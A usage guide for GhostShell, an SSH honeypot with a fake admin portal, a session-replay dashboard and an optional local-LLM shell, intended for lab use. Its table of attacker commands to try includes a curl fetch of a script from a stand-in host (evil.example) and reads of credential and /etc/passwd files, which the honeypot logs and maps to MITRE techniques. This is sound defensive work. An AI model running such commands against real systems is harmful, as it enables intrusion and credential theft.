<div align="center">

# 📖 GhostShell — Usage Guide

**From zero to catching your first attacker in 5 minutes.**

</div>

---

## 🟢 1. Start it

```bash
python3 -m venv .venv
.venv/bin/pip install -r requirements.txt
.venv/bin/python run.py
```

You should see:

```
[+] GhostShell SSH honeypot listening on 0.0.0.0:2222
[+] Fake admin panel on http://localhost:8081
[+] GhostShell dashboard on http://localhost:5000
```

---

## 🎯 2. Attack it (like an attacker would)

```bash
ssh admin@localhost -p 2222
# password: anything — try hunter123, admin, password
```

Inside the fake shell, try:

| Command | What happens |
|---|---|
| `ls` | Fake home directory — `.ssh`, `aws_credentials.txt`, `database_backup.sql` |
| `cat aws_credentials.txt` | 🪤 **Honeytoken hit is logged** |
| `cat /etc/passwd` | Fake users, mapped to MITRE Credential Access |
| `ps aux` | Fake processes — `dockerd`, `server.py` |
| `curl http://evil.example/x.sh` | Logged as Ingress Tool Transfer |
| `sudo -l` | Fake sudo prompt |
| `uname -a` | Fake Ubuntu kernel |

---

## 🌐 3. Try the fake admin panel

Open http://localhost:8081 — fake Acme Corp portal.

- Log in with **any** username / password — it works, and the attempt is logged.
- Visit the fake AWS metadata endpoint:
  `http://localhost:8081/latest/meta-data/iam/security-credentials/acme-prod-role`
- It returns the **same fake AWS key** that lives in the SSH honeytoken file.

---

## 📊 4. Watch the dashboard

Open http://localhost:5000

- **Stats cards** — sessions, commands, honeytoken hits, unique IPs
- **Sessions** — click **Replay →** to see the attacker's terminal, command by command
- **Rules** — click **Rules** to get a Sigma + Suricata rule generated from that session
- **IOC feed** — `GET /api/ioc` → JSON with attacker IPs + honeytoken hits

---

## 🤖 5. Turn on the AI shell (optional)

```bash
# install Ollama from https://ollama.com, then:
ollama pull llama3.2:1b
```

Restart GhostShell. Unusual commands are now answered by the local LLM
like a real Linux box. If Ollama is not running, the rule-based shell
takes over automatically — nothing breaks.

---

## ⚙️ 6. Config

Edit `config.yaml`:

```yaml
ssh_port: 2222
dashboard_port: 5000
fake_http_port: 8081
fake_hostname: "ubuntu-prod-01"
ollama_url: "http://localhost:11434"
ollama_model: "llama3.2:1b"
```

---

## ⚠️ Safety

Lab only. Never expose ports `2222 / 5000 / 8081` to the internet.
All secrets in GhostShell are **fake** — never put real keys in it.
